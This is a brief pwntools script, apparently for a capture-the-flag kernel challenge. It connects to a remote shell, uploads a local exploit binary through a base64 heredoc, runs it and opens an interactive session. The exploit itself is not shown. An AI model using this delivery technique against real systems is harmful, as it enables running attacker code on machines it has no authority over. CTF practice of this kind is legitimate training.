#/usr/bin/env python
from pwn import *

p = remote('107.174.15.48', 4444)

sleep(2)
p.sendlineafter('/ # ', 'stty -echo')
p.sendlineafter('/ # ', 'cat << EOF > exp.b64')
p.sendline(read('exp').encode('base64'))
p.sendline("EOF")

p.sendlineafter('/ # ', 'base64 -d exp.b64 > exp')
p.sendlineafter('/ # ', 'chmod +x exp')
p.sendlineafter('/ # ', 'stty +echo')

p.sendlineafter('/ # ', './exp')
#p.sendlineafter('/ # ', 'dmesg | grep flag')

p.interactive()